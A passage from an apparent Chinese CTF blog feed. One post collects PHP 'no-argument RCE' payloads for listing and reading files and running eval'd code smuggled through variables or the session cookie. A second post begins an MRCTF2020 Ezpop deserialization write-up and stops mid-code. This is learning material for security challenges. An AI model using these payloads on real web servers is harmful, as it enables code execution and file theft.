        <id>http://imfanqie.top/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/</id>
        <title>ctfweb-无参RCE</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/"/>
        <content type="html">&lt;p&gt;最近做题遇到了几道无参数 RCE 的题，基本上还是不会，在此总结一下 payload&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;常见提示：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/[^\W]+\((?R)?\)/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; $_GET&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;xxx&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;有这种屏蔽的，一般都是无参数 rce：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(?R) 引用当前表达式，后面加了？递归调用。允许执行类似 &lt;code&gt;a(b(c()))&lt;/code&gt;  格式的无参数函数；&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;常见方法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.&lt;em&gt; 查看当前目录下的文件&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;localeconv&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#pos () 函数可以替换为 current () 函数，一个意思&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;2.&lt;em&gt; 暴露出数组中文件的名字，方便用函数读取&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_rand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;localeconv&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#原理就是随机生成键并反转，让名字暴露出来&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;3.&lt;em&gt; 读取文件&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#都可以试试&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;4.&lt;em&gt; 进行命令执行输入&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get_defined_vars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;get_defined_vars (void) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等&lt;/li&gt;
&lt;li&gt;curren () ，用于初始指向插入到数组中的第一个单元。&lt;/li&gt;
&lt;li&gt;end ()，作用是将 array 的内部指针移动到最后一个单元并返回其值。&lt;/li&gt;
&lt;li&gt;然后 eval () 执行命令即可。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5.&lt;em&gt; 用 http headers 头部的 session 的函数获取 flag&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;hex2bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;session_id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;配合 burp 即可，把要执行的代码 16 进制后输入 phpsessid&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;后续遇到新的再补充&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="RCE" />
        <updated>2021-08-13T10:49:41.433Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/</id>
        <title>(ctfwp)几道序列化相关的题(POP链、逃逸)</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/"/>
        <content type="html">&lt;p&gt;记录两道实在不会的题，研究了好半天，算是涨姿势了&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1mrctf2020ezpop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1mrctf2020ezpop&#34;&gt;#&lt;/a&gt; 1.[MRCTF2020]Ezpop&lt;/h1&gt;
&lt;p&gt;这道题考察 pop 链，题目中还给了教程，提示的很明显。&lt;/p&gt;
&lt;p&gt;第一次遇到这种题，虽说不是难题，但也没个了解，查了下 wp，&lt;/p&gt;
&lt;p&gt;发现写的都很难懂，解释的很牵强（感觉都出自几个大佬，所以写的很简）&lt;/p&gt;
&lt;p&gt;索性我就自己摸索，搞了大半天终于明白了，遂在这里记录一下。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先放原码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Modifier &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt;  &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__invoke&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;index.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Welcome to &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hacker&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token 